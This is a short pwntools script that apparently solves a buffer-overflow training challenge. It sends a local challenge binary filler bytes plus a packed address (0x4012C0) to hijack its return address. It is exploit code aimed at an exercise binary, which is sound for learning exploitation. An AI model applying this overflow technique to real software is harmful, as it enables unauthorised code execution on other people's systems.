from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

payload = b'QWERTYUIOPqwerty' + b'12345678' + p64(0x4012C0) + b'\n'

print(payload)

io = process('/challenge/buffer-overflow-level1.3')

io.sendafter("Give me your input\n", payload)

while True:
    io.recvline()